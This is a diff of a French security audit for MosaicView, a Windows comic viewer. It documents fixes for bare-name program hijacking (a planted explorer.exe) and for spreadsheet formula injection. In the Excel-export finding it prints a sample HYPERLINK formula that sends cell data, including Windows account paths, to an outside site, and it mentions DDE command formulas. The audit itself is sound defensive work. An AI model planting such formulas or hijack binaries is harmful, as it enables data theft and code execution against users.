 - **Tests** : `test_mail_log_copy.py` (5 tests) — deux retours à la ligne exactement, quelle que soit la fin du journal (4 cas) ; garde-fou AST : toute fonction de `modules/qt/` qui ouvre un `mailto:` avec un corps copie par `copy_log_for_mail`, jamais par `_copy_to_clipboard`, et le scan retrouve bien les deux envois connus.
+
+### C-10 · CB7 protégé par mot de passe : chargement bloqué quand l'application est lancée depuis un terminal
+
+- **Certitude** : Confirmed (reproduit par l'utilisateur) · **Gravité** : moyenne (mode développement seulement) · **Statut** : Corrigé (version 1.10.0).
+- **Code** : `archive_loader.py` → `_run_and_read` (lecture d'un membre 7z), `_list_7z_files` (liste des membres).
+- **Constat** : relevé pendant la migration de P3-3. 7z était lancé avec l'entrée standard de l'application. Pour une archive chiffrée, sans mot de passe fourni, il demande ce mot de passe et l'attend sur cette entrée : lancée depuis un terminal, l'application restait bloquée (mosaïque vide, chargement jamais terminé), et 7z restait en vie après sa fermeture, ce qui empêchait de la relancer. Sans console (exe), 7z échoue aussitôt. La liste des membres avait le même défaut pour une archive aux noms chiffrés. UnRAR n'est pas concerné (`rarfile` le lance déjà sans entrée standard).
+- **Correction** : `stdin=subprocess.DEVNULL` sur les deux appels : 7z échoue tout de suite, la page devient illisible (cadre rouge).
+- **Tests** : `test_password_protected_cb7_reports_every_page` passe désormais par la vraie lecture, sans faux `Popen` ; manuel, CB7 protégé ouvert depuis un terminal.
 
 **Autres faits, sans constat** : avertissement `UserWarning: Duplicate name` signalé par l'utilisateur au premier passage de la suite, venu d'un test qui crée volontairement deux membres homonymes (`test_recompression_keeps_every_member_and_the_archive_comment`) : déclaré attendu sur ce seul test (`pytest.mark.filterwarnings`).
 
@@ -3347,8 +3358,497 @@ Couverture bonne (Audit 6). Ajouté : limite de taille par fichier dans la recom
 
 `run_tests.py` (résumé de ce que vérifie la suite) et le nombre de tests de `CLAUDE.md` et `RELEASE.txt` sont à jour.
 
-**Toujours manquants** : la migration des 30 fichiers de test existants vers `tests/ast_loader.py`, désormais faite au fil des modifications (`test_check_ast_extraction.py`).
+En 1.10.0 : les 30 fichiers de test qui extrayaient à la main migrés vers `tests/ast_loader.py` (P3-3), `load_inner` et ses 2 tests ajoutés, liste `LEGACY` supprimée (suite : 1477 tests).
 
 ## Corrections restant à faire
 
-Faits : P0-1 à P0-5, puis P1-1 à P1-7, P3-1, P3-2, P3-4, P3-5, P3-3 (pour les nouveaux tests), C-1 à C-5, puis P2-1 à P2-8 (le recadrage et la création d'icône de P2-3 en dernier). Entrées ajoutées à la section [1.9.1] du CHANGELOG (C-1 dans « Error log », C-2 à C-4 dans « Batch processes ») ; skills `batch-processing`, `batch-cbr-convert`, `batch-cb7-convert`, `batch-cbt-convert`, `batch-img-convert`, `batch-pdf-convert`, `batch-recompress`, `batch-metadata-import`, `save-export` et `archive-image-loading` mis à jour, ainsi que `CLAUDE.md`. Ensuite : tests de séquence du redimensionnement et du redressement automatique, P4-1 à P4-3, et garde-fou de la migration de P3-3 (faite au fil des modifications) ; P4-4 non retenu. Enfin : test de séquence de la jointure d'images animées, et C-6 (réponses ComicVine) avec ses tests ; clé `comicvine.error_api_bad_answer` traduite dans toutes les langues et vérifiée, entrée « ComicVine » du CHANGELOG [1.9.1] complétée, skills `comicvine-metadata-fetch` et `page-merge` mis à jour. Skills `page-crop` et `create-ico` complétés après les tests du recadrage et de l'icône. Après les P2 : skills `batch-pdf-convert`, `comicvine-metadata-fetch`, `page-straighten`, `archive-image-loading`, `library`, `page-split`, `animated-gif`, `image-format-conversion`, `page-resize` et `corrupted-images` complétés (tests et pièges des tests), `CLAUDE.md` aussi (`load_methods` de `tests/ast_loader.py`). Skills des systèmes couverts par les tests des P1 et P3 mis à jour (`panels`, `undo-redo`, `file-close`, `rotate-flip`, `viewers`, `drag-and-drop`, `adjust-color-depth`, `adjust-effects`, `adjust-image-mode`, `batch-processing`), ainsi que `CLAUDE.md` (garde-fous cités dans les règles du double panneau, des workers, des commandes bloquées, et fenêtres statiques modales de Qt ajoutées aux interdits). En les relisant : le skill `viewers` décrivait les originaux et l'effet mémorisé comme rangés par position de page (`{page_idx: …}`) alors que le code les range par `page_key` — corrigé. Enfin, en relecture finale : C-7 et C-8, entrées « Copy and Paste » et « Error log » de la section [1.9.2] du CHANGELOG, skills `temp-files`, `clipboard` et `page-merge` mis à jour, nombre de tests de `CLAUDE.md` et `RELEASE.txt` porté à 1419. Puis C-9 (journal envoyé par mail) : entrée « Sending a log by email » de la section [1.9.2] du CHANGELOG, dont le titre devient « Minor fixes and improvements », skills `config-storage` et `scan` mis à jour (paragraphe d'historique retiré du second), nombre de tests de `CLAUDE.md` et `RELEASE.txt` porté à 1424.
+Faits : P0-1 à P0-5, puis P1-1 à P1-7, P3-1, P3-2, P3-4, P3-5, P3-3 (pour les nouveaux tests, puis pour tous en 1.10.0, avec C-10), C-1 à C-5, puis P2-1 à P2-8 (le recadrage et la création d'icône de P2-3 en dernier). Entrées ajoutées à la section [1.9.1] du CHANGELOG (C-1 dans « Error log », C-2 à C-4 dans « Batch processes ») ; skills `batch-processing`, `batch-cbr-convert`, `batch-cb7-convert`, `batch-cbt-convert`, `batch-img-convert`, `batch-pdf-convert`, `batch-recompress`, `batch-metadata-import`, `save-export` et `archive-image-loading` mis à jour, ainsi que `CLAUDE.md`. Ensuite : tests de séquence du redimensionnement et du redressement automatique, P4-1 à P4-3, et garde-fou de la migration de P3-3 (faite au fil des modifications) ; P4-4, d'abord non retenu, corrigé en 1.10.0. Enfin : test de séquence de la jointure d'images animées, et C-6 (réponses ComicVine) avec ses tests ; clé `comicvine.error_api_bad_answer` traduite dans toutes les langues et vérifiée, entrée « ComicVine » du CHANGELOG [1.9.1] complétée, skills `comicvine-metadata-fetch` et `page-merge` mis à jour. Skills `page-crop` et `create-ico` complétés après les tests du recadrage et de l'icône. Après les P2 : skills `batch-pdf-convert`, `comicvine-metadata-fetch`, `page-straighten`, `archive-image-loading`, `library`, `page-split`, `animated-gif`, `image-format-conversion`, `page-resize` et `corrupted-images` complétés (tests et pièges des tests), `CLAUDE.md` aussi (`load_methods` de `tests/ast_loader.py`). Skills des systèmes couverts par les tests des P1 et P3 mis à jour (`panels`, `undo-redo`, `file-close`, `rotate-flip`, `viewers`, `drag-and-drop`, `adjust-color-depth`, `adjust-effects`, `adjust-image-mode`, `batch-processing`), ainsi que `CLAUDE.md` (garde-fous cités dans les règles du double panneau, des workers, des commandes bloquées, et fenêtres statiques modales de Qt ajoutées aux interdits). En les relisant : le skill `viewers` décrivait les originaux et l'effet mémorisé comme rangés par position de page (`{page_idx: …}`) alors que le code les range par `page_key` — corrigé. Enfin, en relecture finale : C-7 et C-8, entrées « Copy and Paste » et « Error log » de la section [1.9.2] du CHANGELOG, skills `temp-files`, `clipboard` et `page-merge` mis à jour, nombre de tests de `CLAUDE.md` et `RELEASE.txt` porté à 1419. Puis C-9 (journal envoyé par mail) : entrée « Sending a log by email » de la section [1.9.2] du CHANGELOG, dont le titre devient « Minor fixes and improvements », skills `config-storage` et `scan` mis à jour (paragraphe d'historique retiré du second), nombre de tests de `CLAUDE.md` et `RELEASE.txt` porté à 1424.
+
+---
+
+# Audit 11 — Sécurité globale : dépendances, processus externes, réseau, secrets, distribution (version 1.10.0)
+
+- **Période** : octobre 2026. **Rapport initial** enregistré avant toute correction ; statuts complétés après les corrections (intégrées à la version 1.10.0, pas encore publiée), sans réécrire les constatations.
+- **Objet** : audit de sécurité complémentaire de l'Audit 6 (fichiers malformés et entrées hostiles), qu'il ne refait pas. Domaines : dépendances et composants tiers ; exécution de processus externes ; réseau et API ; secrets et informations sensibles ; fichiers temporaires ; privilèges et isolation ; distribution et mises à jour ; journalisation et divulgation d'informations ; configuration de sécurité ; chaîne de développement et de livraison.
+- **Échelle de priorités propre à cet audit** (elle remplace, pour cette section seulement, celle de l'en-tête commun, comme pour l'Audit 6) : **P0** compromission grave et réaliste (exécution de code non autorisée, compromission importante des données ou du système) · **P1** vulnérabilité exploitable à impact sérieux sur la confidentialité, l'intégrité ou le système · **P2** vulnérabilité dont l'impact ou les conditions d'exploitation sont plus limités · **P3** risque limité, protection perfectible, défense en profondeur insuffisante · **P4** amélioration de conception utile à la sécurité, sans vulnérabilité démontrée. Certitude et statut suivent les conventions communes (*Confirmed* / *Very likely* / *Possible*).
+- **Méthode** : identification de l'architecture réelle (application PySide6 pour Windows, distribuée par PyInstaller en deux variantes, ONE DIR et ONE FILE, publiées à la main sur GitHub Releases ; aucun installateur, aucune mise à jour automatique, aucune CI : `.github/` ne contient que des modèles d'issues). Lecture des deux `.spec`, de `requirements*.txt`, `RELEASE.txt`, `.gitignore`, des fichiers suivis par Git ; inventaire des paquets du `.venv` de compilation ; recherche transversale de tous les lancements de programmes (`subprocess`, `os.startfile`, `ShellExecute`, COM), de tous les accès réseau (`urlopen`, `requests`), des chargements de DLL (`ctypes`), du registre (`winreg`), des décodages d'images par Qt, des écritures de fichiers à l'usage d'autres programmes (export Excel), de `eval`/`exec`/`pickle` ; lecture du code de chaque site trouvé jusqu'à son origine. Recherche de secrets dans le code et dans tout l'historique Git (77 commits). Vérifications sans danger, hors du dépôt, dans le dossier temporaire de la session : copie de `whoami.exe` renommée `hostname.exe` placée dans un dossier courant, puis `subprocess.run(['hostname'])` (P2-1) ; comportement d'`openpyxl` 3.1.5 sur une chaîne commençant par `=` (P2-2) ; détection de dossier verrouillé de `cleanup_stale_mei_dirs`. Versions des outils natifs lues dans leurs métadonnées (7-Zip 26.03, non signé comme les binaires officiels ; UnRAR 7.23.0, signature Authenticode valide). Vulnérabilités publiques des dépendances recherchées en ligne (Pillow, PyMuPDF, urllib3, lxml). Aucune commande Qt lancée ; aucune modification de code avant ce rapport.
+- **Code de référence** : MosaicView 1.10.0 (dépôt au commit `8e45af3`). Python 3.11.9, PyInstaller 6.21.0, PySide6 6.11.2, Pillow 12.3.0, PyMuPDF 1.28.2, requests 2.34.2, urllib3 2.7.0, lxml 6.1.3, defusedxml 0.7.1, openpyxl 3.1.5, rarfile 4.3, numpy 2.3.3, opencv-python 5.0.0.93, pywin32 312.
+
+## Executive summary
+
+| Priorité | Constats | Certitude | Statut |
+|---|---|---|---|
+| **P0** | 0 | — | — |
+| **P1** | 0 | — | — |
+| **P2** | 2 | 2 Confirmed (P2-1 : mécanisme reproduit, dossier courant à l'ouverture par association *Very likely*) | 2 corrigés, validés dans l'application |
+| **P3** | 2 | 1 Confirmed (code) / Possible (scénario), 1 Possible | P3-1 corrigé, validé dans l'application ; P3-2 non retenu (choix de l'utilisateur) |
+| **P4** | 3 | 1 Confirmed, 1 Possible, 1 informatif | P4-1 corrigé pour la fenêtre d'erreur ; P4-2 corrigé (test automatique) ; P4-3 non retenu |
+| **Constats ajoutés pendant les corrections** | 3 | Confirmed | C-1 et C-2 corrigés (Bibliothèque, antérieurs à l'audit, sans rapport avec la sécurité) ; C-3 corrigé (garde-fou de P2-1) |
+
+**Principales zones à risque** :
+- lancement de programmes Windows par leur seul nom (`explorer`, `notepad.exe`), que Windows cherche d'abord dans le dossier de l'exe puis dans le dossier courant (P2-1) ;
+- fichiers produits pour d'autres programmes à partir de données externes : export Excel de la Bibliothèque (P2-2) ;
+- chemins de décodage qui contournent la restriction des formats d'image de l'Audit 6 (P3-1) ;
+- intégrité des exécutables livrés et confiance accordée au dossier de l'exe (P3-2, P4-3).
+
+**Causes communes** :
+
+| Cause | Constats |
+|---|---|
+| **Un emplacement que l'utilisateur ne contrôle pas est traité comme de confiance** (dossier courant, dossier de l'exe ONE FILE, souvent « Téléchargements ») | P2-1, P3-2 ; même famille que l'Audit 6, P2-4 (jonctions NTFS suivies) |
+| **Donnée externe transmise à un programme qui l'interprète** (ici un tableur qui exécute `=…`) | P2-2 ; même famille que l'Audit 6, P0-1 et P1-1 (jokers de 7z, HTML des `QLabel`) |
+| **Restriction centrale contournée par un chemin secondaire** (repli sur un autre décodeur, autre fenêtre en détection automatique) | P3-1, P4-1 ; même famille que l'Audit 6, C-8 et C-11 (chemins de lecture hors des lecteurs communs) |
+| **Livraison manuelle sans trace vérifiable** (pas de signature, d'empreinte publiée ni de versions figées) | P3-2, P4-3 |
+
+**Ce qui est solide** (détail dans « Zones examinées sans problème ») : aucun `shell=True`, aucun `eval`/`exec`/`pickle` ; outils d'archive lancés par chemin absolu dans le dossier de l'exe, avec `--` et l'entrée standard fermée ; TLS vérifié partout (aucun `verify=False` ni contexte SSL désactivé), délais réseau présents ; pas de mise à jour automatique (la vérification ne fait que comparer un numéro et ouvrir une page fixe) ; aucun secret dans le code ni l'historique ; clé API chiffrée par DPAPI et masquée dans les messages et le journal ; aucun privilège élevé (manifeste `asInvoker`, registre `HKCU` seulement) ; PyMuPDF isolé dans des process séparés ; versions des dépendances et des outils natifs embarqués à jour, sans vulnérabilité publique connue dans les versions utilisées.
+
+---
+
+## P0 — Critique
+
+Aucun constat.
+
+## P1 — Élevée
+
+Aucun constat.
+
+---
+
+## P2 — Moyenne
+
+### P2-1 · Programmes Windows lancés par leur seul nom : un `explorer.exe` ou `notepad.exe` placé dans le dossier courant ou à côté de l'exe est exécuté à la place de celui de Windows
+
+- **Certitude** : Confirmed (mécanisme reproduit) ; dossier courant égal au dossier du document à l'ouverture par « Ouvrir avec » / double-clic : *Very likely* (comportement habituel de l'Explorateur, non mesuré dans l'application) · **Gravité** : exécution d'un programme arbitraire avec les droits de l'utilisateur, au clic sur une commande ordinaire · **Statut** : Corrigé
+- **Code concerné** :
+  - `panel_widget.PanelWidget._open_temp_folder`, `_open_config_folder` : `subprocess.Popen(["explorer", dossier])` (mode d'emploi, section Configuration) ;
+  - `error_log_dialog_qt` (clic sur le chemin du journal quand il n'existe pas encore) : `["explorer", self._folder]` ;
+  - `user_guide_qt` → `_on_anchor_clicked` : `["explorer", path]`, `["explorer", "/select,", path]` ;
+  - `library_window._explorer_select` (repli quand `SHOpenFolderAndSelectItems` échoue, utilisé par toute l'application, skill `explorer-select`) et `LibraryWindow._action_open_explorer` : `['explorer', …]` ;
+  - `batch_metadata_dialog_qt._open_log` : `["notepad.exe", path]` (lien « voir le journal » du résumé de l'import de métadonnées en lot) ;
+  - mode développement seulement : `archive_loader._get_7z_exe` rend `os.path.abspath(".")\7zip\7z.exe` quand `sys._MEIPASS` n'existe pas, c'est-à-dire un `7z.exe` pris dans le **dossier courant**, lancé ensuite à chaque ouverture d'un CB7 (même construction, sans exécution, pour les ressources de `font_loader.resource_path`, `localization`, `menubar_qt`, `comicinfo_dialog_qt`, `easter_eggs_qt`).
+- **Constat** : `subprocess.Popen` avec une liste et sans `executable` appelle `CreateProcess(NULL, ligne de commande)`. Pour un nom sans chemin, Windows cherche dans l'ordre : le dossier de l'exe appelant, **le dossier courant**, `System32`, puis le dossier Windows (`explorer.exe` n'est que dans ce dernier), puis le `PATH`. Le dossier courant n'est écarté que si la variable `NoDefaultCurrentDirectoryInExePath` est définie, ce qui n'est pas le cas d'une session Windows ordinaire. MosaicView ne fixe jamais son dossier courant (aucun `os.chdir`).
+- **Reproduction (sans danger)** : dossier contenant une copie de `whoami.exe` nommée `hostname.exe` ; depuis ce dossier, `subprocess.run(['hostname'])` affiche le nom du compte (copie lancée) au lieu du nom de la machine. Avec `NoDefaultCurrentDirectoryInExePath=1`, c'est le vrai `hostname` qui s'exécute.
+- **Scénarios de déclenchement** :
+  1. L'utilisateur télécharge un lot de BD sous forme d'archive (ZIP, torrent) qui contient aussi un fichier `explorer.exe` (éventuellement caché, attribut conservé par 7-Zip ou WinRAR). Il double-clique sur un CBZ de ce dossier : MosaicView démarre avec ce dossier comme dossier courant. Plus tard, il clique sur « Ouvrir le dossier des fichiers temporaires », sur le chemin du journal, sur « Ouvrir dans l'Explorateur » de la Bibliothèque, ou un repli de `_explorer_select` se produit : le programme du dossier est lancé, sans que l'utilisateur ait double-cliqué sur un exécutable.
+  2. Version ONE FILE lancée depuis le dossier Téléchargements : tout `explorer.exe` ou `notepad.exe` présent dans ce dossier (téléchargé par un site, après l'avertissement du navigateur) est lancé de la même manière (dossier de l'exe, premier de l'ordre de recherche).
+- **Prérequis** : pouvoir déposer un fichier d'un nom précis dans un dossier que l'utilisateur ouvre ou d'où il lance MosaicView, puis action de l'utilisateur sur l'une des commandes citées. D'où P2 et non P1 : impact fort, conditions réelles mais restreintes.
+- **Protections existantes** : aucune pour ce cas ; les outils d'archive embarqués (`7z.exe`, `UnRAR.exe`) sont, eux, lancés par chemin absolu dans l'exe compilé.
+- **Comportement attendu** : un programme de Windows est toujours lancé par son chemin complet dans le dossier Windows ; un outil embarqué est cherché à côté du code, jamais dans le dossier courant.
+- **Correction recommandée** : une fonction commune dans `utils.py` qui rend le chemin complet d'un programme de Windows (dossier Windows lu par `GetWindowsDirectoryW`, `explorer.exe` à sa racine, `notepad.exe` dans `System32`), utilisée par tous les sites ci-dessus ; `_get_7z_exe` (et, par cohérence, les autres `abspath(".")`) fondé sur l'emplacement du code (`__file__`) en mode développement. Garde-fou AST : aucun appel `subprocess.Popen`/`run` dont le premier élément est un littéral sans chemin.
+- **Tests existants** : aucun. **Tests à ajouter** : la fonction commune rend un chemin absolu existant ; garde-fou AST ; `_get_7z_exe` indépendant du dossier courant.
+- **Correction appliquée** : `utils.windows_program(name)` — dossier Windows lu par `GetSystemWindowsDirectoryW` (repli : variable `SystemRoot`, puis `C:\Windows`), `explorer.exe` à sa racine, tout autre programme dans `System32` ; utilisée par les 8 sites (`PanelWidget._open_temp_folder`, `_open_config_folder`, fenêtre du journal des erreurs, `user_guide_qt._on_anchor_clicked`, les deux replis de `library_window._explorer_select`, `LibraryWindow._action_open_explorer`, `batch_metadata_dialog_qt._open_log`). `archive_loader._get_7z_exe` hors exe compilé : dossier du projet déduit de `__file__`. Les autres `os.path.abspath(".")` (ressources en mode développement : polices, traductions, icônes) n'exécutent rien et n'ont pas été modifiés.
+- **Tests** : `tests/test_windows_programs.py` (nouveau, 6 tests) : `explorer.exe` dans le dossier Windows, `notepad.exe` dans `System32`, chemins existants et indépendants du dossier courant ; garde-fou AST sur `modules/qt/` et `MosaicView.py` (aucun appel `subprocess.Popen`/`run`/`call`/`check_call`/`check_output` dont le programme est un littéral sans dossier), avec son auto-test ; `_get_7z_exe` indépendant du dossier courant. `tests/test_error_reporting.py` adapté (fournit `__file__` à l'extraction AST de `_get_7z_exe`). Manuel, validé : dossiers temporaire et de configuration du mode d'emploi, chemin du journal des erreurs, « Ouvrir dans l'Explorateur » et lien d'export de la Bibliothèque, journal de l'import de métadonnées en lot dans le Bloc-notes. Le lancement de `MosaicView.py` depuis un autre dossier (7z) n'a pas été essayé (couvert par le test automatique).
+- **Interactions** : skill `explorer-select` (repli de `_explorer_select`) ; Audit 6, P0-2 (ouverture avec l'application par défaut : elle passe par `os.startfile`, qui n'est pas concerné, car le chemin est complet).
+
+### P2-2 · Export Excel de la Bibliothèque : une métadonnée qui commence par `=` devient une formule exécutée par le tableur
+
+- **Certitude** : Confirmed (code et comportement d'`openpyxl` vérifiés) · **Gravité** : exfiltration du catalogue (chemins, donc nom du compte Windows, titres) ou lien piégé dans un fichier que l'utilisateur considère comme le sien · **Statut** : Corrigé
+- **Code concerné** : `library_window.py` → `LibraryWindow._action_export` : chaque valeur est ajoutée par `data.append(str(val))` puis `ws.append(data)`.
+- **Constat** : `openpyxl` donne le type « formule » (`data_type == 'f'`) à toute chaîne qui commence par `=` (vérifié : `'=HYPERLINK("http://x","a")'` → `f`). Les colonnes exportées viennent du ComicInfo.xml des fichiers indexés (série, titre, auteurs, résumé, éditeur…) et des noms de fichiers, c'est-à-dire de BD téléchargées. Le classeur produit n'a pas de valeurs calculées en cache : Excel ou LibreOffice calculent les formules à l'ouverture. Le fichier est créé localement, donc sans marque « venu d'Internet » ni mode protégé.
+- **Scénario** : un CBZ diffusé avec `<Title>=HYPERLINK("https://site/?d="&B5&C5,"Ouvrir")</Title>` ou une formule réseau (`WEBSERVICE`, `IMPORTXML` dans d'autres tableurs) ; l'utilisateur indexe son dossier, exporte la Bibliothèque et ouvre le classeur : la cellule envoie au site, au clic ou au calcul selon le tableur, le contenu d'autres cellules (dont la colonne des dossiers, qui contient `C:\Users\<compte>`). Les formules DDE (`=cmd|…`) sont bloquées par défaut dans les Excel récents : exécution de commande non retenue.
+- **Prérequis** : un comic piégé indexé, un export, puis l'ouverture dans un tableur. D'où P2.
+- **Protections existantes** : aucune (les autres affichages de métadonnées sont protégés depuis l'Audit 6, P1-1, mais l'export n'était pas dans son périmètre).
+- **Comportement attendu** : toute valeur textuelle est écrite comme texte, affichée telle quelle par le tableur.
+- **Correction recommandée** : forcer le type texte (`cell.data_type = 's'`) pour toute cellule dont la valeur est une chaîne, ce qui garde le texte exact (vérifié : écrit en `inlineStr`) au lieu de le préfixer d'une apostrophe. Fonction séparée de la fenêtre pour être testée sans Qt.
+- **Tests à ajouter** : une ligne contenant `=…`, `+…`, `-…`, `@…` produit des cellules de type texte, valeurs inchangées ; nombres (taille) gardés numériques.
+- **Correction appliquée** : `library_window._excel_text_cells(cells)` (fonction de module, testable sans Qt) donne le type texte (`data_type = 's'`) à toute cellule dont la valeur est une chaîne ; appelée sur chaque ligne de données après `ws.append`. Texte gardé exact, sans apostrophe ajoutée.
+- **Tests** : `tests/test_library_excel_export.py` (nouveau, 3 tests, classeur réellement écrit puis relu) : sans correction, `openpyxl` écrit bien une formule (le danger est réel) ; avec correction, aucune formule, valeurs inchangées, type texte ; nombres gardés numériques. Manuel, validé : CBZ de test dont le ComicInfo.xml contient `=1+1`, `=HYPERLINK(…)`, `+2+3`, `@SUM(1,2)`, `-4+5`, indexé puis exporté ; le classeur produit ne contient aucune formule et ces 5 valeurs en texte (vérifié en relisant le fichier).
+- **Interactions** : Bibliothèque (`library_db`, index du ComicInfo.xml) ; règle de sécurité n° 3 de `CLAUDE.md` (même principe : le texte externe n'est jamais interprété).
+
+---
+
+## P3 — Faible
+
+### P3-1 · Couverture ComicVine : quand Pillow ne sait pas la lire, les octets sont confiés aux décodeurs de Qt, plus nombreux, ce qui contourne la restriction des formats de l'Audit 6
+
+- **Certitude** : Confirmed (code) / Possible (scénario) · **Statut** : Corrigé (repli supprimé) ; plugins laissés dans les `.spec` (choix de l'utilisateur) · **Lien** : Audit 6, P1-2 (`restrict_pillow_formats`)
+- **Code concerné** : `comicvine_dialog_qt.py` → fonction qui convertit la couverture téléchargée (`_ImageWorker` → `QPixmap.fromImage(QImage.fromData(data))`) : Pillow convertit en JPEG ; en cas d'échec, `# repli : données confiées telles quelles à Qt`. `MosaicView_ONE_DIR.spec` / `MosaicView_ONE_FILE.spec` embarquent **tous** les plugins `imageformats` de PySide6 (`qgif`, `qico`, `qjpeg`, `qtiff`, `qwebp`, mais aussi `qsvg`, `qtga`, `qicns`, `qwbmp`, `qpdf`).
+- **Constat** : un fichier qu'aucun des 9 formats autorisés ne reconnaît est justement celui qui part vers Qt, qui essaie alors tous ses plugins d'après le contenu. L'adresse vient de la réponse ComicVine ; `_parse_image_url` accepte `http://` : une réponse ou une image servie en clair peut être remplacée par un tiers sur le réseau.
+- **Impact** : surface d'attaque élargie (décodeurs SVG, TGA, ICNS, et PDF par PDFium si `Qt6Pdf.dll` est présent) dans le process de l'application, à l'affichage d'une simple vignette. Aucune faille connue n'est exploitée ici : défense en profondeur.
+- **Correction recommandée** : en cas d'échec de Pillow, rendre une image vide (même résultat qu'une image illisible aujourd'hui) ; retirer des `.spec` les plugins `imageformats` inutiles (les icônes sont toutes en PNG ou ICO) — modification de distribution, à valider par l'utilisateur.
+- **Tests à ajouter** : fonction de conversion extraite par AST : octets non reconnus par Pillow → aucun appel à `QImage.fromData`.
+- **Correction appliquée** : `comicvine_dialog_qt._bytes_to_pixmap` rend `None` quand Pillow ne lit pas l'image (la fenêtre affiche alors un tiret, comme pour une image vide) ; seul le JPEG réencodé est confié à Qt, avec son format indiqué (`QImage.fromData(…, "JPEG")`). `_cover_pixmap_from_state` (couverture tirée du comic ouvert) essaie désormais la page suivante quand une page n'est pas lisible, au lieu de renvoyer une image vide.
+- **Plugins `imageformats`** : mesurés (1,9 Mo en tout ; `qicns`, `qpdf`, `qsvg`, `qtga`, `qwbmp` : environ 210 Ko). Gain de taille nul et, le seul chemin connu étant fermé, gain de sécurité très faible : laissés, choix de l'utilisateur.
+- **Tests** : `tests/test_comicvine_cover_decoding.py` (nouveau, 2 tests, `QImage`/`QPixmap` remplacés) : image lisible confiée à Qt en JPEG ; SVG, PDF et octets quelconques jamais confiés à Qt. Manuel, validé : couvertures ComicVine affichées comme avant ; CBZ de test dont la première page est illisible → la couverture affichée est la page 2.
+
+### P3-2 · Exécutables livrés sans signature ni empreinte publiée ; la version ONE FILE fait confiance au dossier d'où elle est lancée
+
+- **Certitude** : Possible (dépend de l'emplacement choisi par l'utilisateur) · **Statut** : Non corrigé, non retenu — l'utilisateur juge la signature de code (certificat, vérification d'identité, `signtool` ou compilation sur GitHub Actions) disproportionnée pour le projet ; les empreintes publiées et la recommandation du README n'ont pas été retenues non plus
+- **Constat** :
+  - Les exécutables publiés sur GitHub Releases ne sont pas signés (`codesign_identity=None`, procédure de `RELEASE.txt`), et aucune empreinte SHA-256 n'est publiée : un utilisateur ne peut pas vérifier qu'un exécutable reçu d'un miroir ou d'un tiers est bien celui de l'auteur.
+  - La version ONE FILE est typiquement lancée depuis « Téléchargements ». Windows y cherche en premier les DLL non système du chargeur PyInstaller et des process enfants, et Qt ajoute le dossier de l'exe (`QCoreApplication::applicationDirPath`) à ses chemins de plugins. Une DLL ou un sous-dossier de plugins déposé à côté de l'exe pourrait donc être chargé. Ce risque est commun à toute application lancée depuis un dossier partagé avec des téléchargements, et Microsoft le considère comme relevant de l'emplacement choisi ; il n'est pas corrigeable dans le code Python (il intervient avant son exécution). Il complète P2-1, qui, lui, est corrigeable.
+- **Correction recommandée** (choix de l'utilisateur) : publier l'empreinte SHA-256 de chaque fichier dans la note de version (coût nul, étape à ajouter à `RELEASE.txt`) ; recommander dans le README de placer l'exe dans un dossier dédié ; signature de code envisageable plus tard (certificat payant).
+- **Tests** : sans objet (procédure de publication).
+
+---
+
+## P4 — Informatif
+
+| # | Constat | Certitude | Code | Recommandation |
+|---|---|---|---|---|
+| **P4-1** | `ErrorDialog` et `InfoDialog` affichent leur message en détection automatique (pas de `Qt.PlainText`). Un message dont la **première ligne** contient une balise connue (ou `&lt;`) est rendu en HTML, `<img src="\\serveur\…">` compris (mécanisme de l'Audit 6, P1-1). Les 96 messages qui insèrent une valeur variable ont été passés en revue : les valeurs externes possibles en première ligne sont des noms de fichiers sur disque (sans `<` ni `>` sous Windows) ou des messages d'exception sans nom de membre ; les noms de membres d'archive passent par des fenêtres déjà en texte brut. **Aucun chemin exploitable trouvé**, mais la protection repose sur la forme de chaque message et de chaque traduction. | Possible | `dialogs_qt.ErrorDialog`, `InfoDialog` | `ErrorDialog` en texte brut par défaut, sauf indication contraire de l'appelant (vérifier les messages qui comptent sur `<br>` ou `&nbsp;`) ; étendre `tests/test_check_plain_text_labels.py`. |
+| **P4-2** | Envoi du journal par mail : la ligne ajoutée quand le journal est tronqué (`error_log.mail_partial`) contient le chemin complet du journal, donc `C:\Users\<compte>\…`, alors que tout le reste du journal remplace le dossier du profil par `%USERPROFILE%` (Audit 9, P2-2). | Confirmed | `error_log_dialog_qt.mail_content` | Passer ce chemin par `error_log._shorten_paths`. |
+| **P4-3** | Compilation non reproductible et provenance non tracée : `requirements.txt` en `>=` sans fichier de versions figées ; l'environnement de compilation contient des paquets étrangers à l'application (playwright, py7zr, pycryptodomex, pyturbojpeg, beautifulsoup4, psutil…), qui n'entrent dans l'exe que s'ils sont importés, mais rendent son contenu dépendant de cet environnement ; `7z.exe`, `7z.dll` et `UnRAR.exe` sont versionnés sans source ni empreinte notées (versions vérifiées à jour, skill `check-embedded-versions`). | — | `requirements.txt`, `.spec`, `7zip/`, `unrar/` | Fichier de versions figées pour la compilation (`pip freeze` de l'environnement utilisé) ; empreintes et adresse de téléchargement des outils natifs dans leur `license.txt` ou dans le skill `check-embedded-versions`. |
+
+---
+
+**Suites données aux P4** :
+
+| # | Statut | Correction | Tests |
+|---|---|---|---|
+| **P4-1** | Corrigé pour `ErrorDialog` ; `InfoDialog` inchangé | Vérification faite avant la correction : aucun des 42 messages affichés par `ErrorDialog` ne contient de HTML, dans aucune des 47 langues, et aucun appelant n'y ajoute de lien. `setTextFormat(Qt.PlainText)` posé dans `ErrorDialog.__init__` avant tout texte ; rien ne change à l'écran. `InfoDialog` affiche volontairement des liens (chemin d'un fichier exporté) : laissé en détection automatique, sans chemin exploitable connu. | `test_check_plain_text_labels.py` (1 nouveau : `test_error_dialog_is_plain_text`) |
+| **P4-2** | Corrigé | `mail_content` passe le chemin du journal par `error_log._shorten_paths` : `%USERPROFILE%\…`, comme le reste du journal. | `test_error_log.py` (test existant de `mail_content` complété : chemin du profil absent, `%USERPROFILE%` présent). Non essayé dans l'application (journal tronqué difficile à provoquer) |
+| **P4-3** | Non retenu | Choix de l'utilisateur : pas d'étape supplémentaire à la publication (versions figées), provenance des outils natifs jugée sans intérêt pour le projet. | — |
+
+## Constats ajoutés pendant les corrections
+
+| # | Constat | Suite |
+|---|---|---|
